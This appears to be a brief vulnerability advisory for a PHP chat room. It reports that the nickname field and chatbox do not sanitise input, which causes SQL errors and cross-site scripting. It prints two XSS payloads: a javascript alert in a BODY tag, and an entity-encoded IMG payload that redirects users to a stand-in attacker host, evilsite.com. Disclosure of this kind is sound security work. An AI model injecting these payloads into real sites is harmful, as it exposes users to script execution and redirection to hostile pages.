Homepage:

Description:
An online chat room that lets users chat with each other.

Effected files:
fastchat.php
fastshow.php

The nickname input form doesn't sanatize user input before it adds it to the db. In turn this can cause SQL query errors such as:

UPDATE cp_users SET lastaction=NOW() WHERE nick='<BODY BACKGROUND="javascript:alert('XSS')">'
You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS')">'' at line 3 


XSS Vuln by submitting malicious text in the chatbox:

<IMG SRC=javascript:window.location(&#0000039http://www.evilsite.com/badcode&#0000039)>
